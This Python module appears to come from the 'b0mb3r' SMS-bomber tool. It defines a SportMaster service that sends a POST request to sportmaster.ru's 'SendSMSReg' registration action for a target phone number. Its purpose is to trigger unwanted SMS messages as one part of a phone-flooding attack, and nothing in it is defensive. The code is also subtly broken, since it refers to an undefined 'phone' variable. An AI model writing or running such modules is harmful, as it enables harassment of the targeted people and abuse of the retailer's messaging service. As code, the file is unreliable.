from b0mb3r.services.service import Service


class SportMaster(Service):
    async def run(self):
        await self.post(
            "https://www.sportmaster.ru/",
            params={"module": "users", "action": "SendSMSReg", "phone": phone},
        )
